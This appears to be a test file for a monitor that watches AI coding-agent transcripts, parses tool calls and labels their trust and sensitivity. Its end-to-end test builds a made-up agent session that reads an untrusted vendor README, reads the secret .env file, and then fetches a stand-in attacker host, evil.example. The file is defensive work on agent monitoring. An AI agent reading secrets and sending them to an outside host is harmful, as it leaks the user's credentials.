"""Tests for the full-activity monitor: transcript parsing, the JSONL tailer,
and an end-to-end pass over a fabricated Claude-style transcript."""
import json

from monitor.normalize import normalize_line
from monitor.tailer import JsonlTailer
from monitor.daemon import Monitor


def tool_use_line(session, name, inp, ts="2026-11-07T12:00:00Z"):
    return json.dumps({
        "type": "assistant", "sessionId": session, "timestamp": ts,
        "message": {"role": "assistant",
                    "content": [{"type": "tool_use", "id": "t1", "name": name, "input": inp}]},
    })


# ---- normalize ----

def test_normalize_read():
    acts = normalize_line(tool_use_line("s", "Read", {"file_path": "/work/src/app.py"}))
    assert len(acts) == 1 and acts[0].op == "ReadFile" and acts[0].target == "/work/src/app.py"


def test_normalize_bash_web_mcp():
    assert normalize_line(tool_use_line("s", "Bash", {"command": "pytest"}))[0].op == "RunCommand"
    web = normalize_line(tool_use_line("s", "WebFetch", {"url": "https://evil.example/u?x=1"}))
    assert web[0].op == "NetworkRequest" and web[0].target == "evil.example"
    assert normalize_line(tool_use_line("s", "mcp__db__query", {"q": "1"}))[0].op == "CallTool"


def test_normalize_ignores_text_and_bad_lines():
    assert normalize_line('{"type":"assistant","message":{"content":[{"type":"text","text":"hi"}]}}') == []
    assert normalize_line("not json") == []


# ---- tailer ----

def test_tailer_reads_only_new(tmp_path):
    f = tmp_path / "t.jsonl"
    f.write_text("a\nb\n", encoding="utf-8")
    t = JsonlTailer(str(f))
    assert t.read_new() == ["a", "b"]
    assert t.read_new() == []
    with open(f, "a", encoding="utf-8") as fh:
        fh.write("c\n")
    assert t.read_new() == ["c"]


def test_tailer_withholds_partial_line(tmp_path):
    f = tmp_path / "t.jsonl"
    f.write_text("x\npar", encoding="utf-8")
    t = JsonlTailer(str(f))
    assert t.read_new() == ["x"]            # 'par' withheld (no newline yet)
    with open(f, "a", encoding="utf-8") as fh:
        fh.write("tial\n")
    assert t.read_new() == ["partial"]


# ---- end-to-end ----

def test_monitor_end_to_end(tmp_path):
    proj = tmp_path / "projects" / "slug"
    proj.mkdir(parents=True)
    tr = proj / "sess-1.jsonl"
    lines = [
        tool_use_line("sess-1", "Read", {"file_path": "/repo/vendor/README.md"}),
        tool_use_line("sess-1", "Read", {"file_path": "/repo/.env"}),
        tool_use_line("sess-1", "WebFetch", {"url": "https://evil.example/u"}),
    ]
    tr.write_text("\n".join(lines) + "\n", encoding="utf-8")

    events = []
    mon = Monitor(projects_dir=str(tmp_path / "projects"),
                  on_event=lambda e, a: events.append((e, a)))
    mon.poll_once()

    ops = [e.op.value for e, _ in events]
    assert ops == ["ReadFile", "ReadFile", "NetworkRequest"]
    assert events[0][0].labels.effective_trust.value == "untrusted"   # vendor/ -> untrusted
    assert events[1][0].labels.sensitivity.value == "secret"          # .env -> secret
    net_agg = events[2][1]                                            # the exit action's aggregate
    assert net_agg.reached_untrusted and net_agg.reached_secret

    # a second poll with no new lines yields nothing (tailer offset holds)
    events.clear()
    mon.poll_once()
    assert events == []
